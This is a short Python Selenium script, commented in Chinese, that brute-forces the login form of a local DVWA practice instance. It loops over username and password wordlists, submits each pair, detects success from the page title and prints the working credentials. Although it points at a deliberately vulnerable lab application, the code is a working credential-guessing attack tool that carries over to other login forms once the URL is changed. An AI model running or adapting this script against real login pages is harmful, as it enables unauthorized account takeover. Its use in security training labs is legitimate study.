from selenium import webdriver
import time
import os
import requests

driver = webdriver.Chrome()
driver.get('http://127.0.0.1/dvwa/login.php')

username = []
password = []

with open('user.txt', 'r') as f:
    username = f.readlines()

with open('passwordlist.txt', 'r') as f:
    password = f.readlines()

for u in range(0,len(username)):
    for p in range(0,len(password)):
        # 重新获取元素，尤其是在登录成功后
        # 元素获取需要根据实际场景,进行修改
        user = driver.find_element_by_name('username')
        passwd = driver.find_element_by_name('password')
        # btn = driver.find_element_by_xpath('//button[@name="loginButton"]')
        btn = driver.find_element_by_name('Login')

        user.send_keys(username[u].rstrip('\n'))
        passwd.send_keys(password[p].rstrip('\n'))
        btn.click()

        # 登录成功跳转，有一定时间差，为后续获取登录成功前后标题对比
        # time.sleep(3)
        driver.implicitly_wait(10)

        # 登录成功判断，标题判断（也可采用其他判断方式）
        # 这里对比与登录后标题不一致进行判断
        if 'Login' not in driver.title :
            print('用户名：' + username[u].rstrip('\n') + ' ' +'密码：' + password[p].rstrip('\n'))
            
            # 清楚cookie,返回登录界面,继续其他用户的爆破
            driver.delete_all_cookies()
            driver.get('http://127.0.0.1/dvwa/login.php')
            # time.sleep(2)
            driver.implicitly_wait(10)
            break

        # 清除登录框
        user.clear()
        passwd.clear()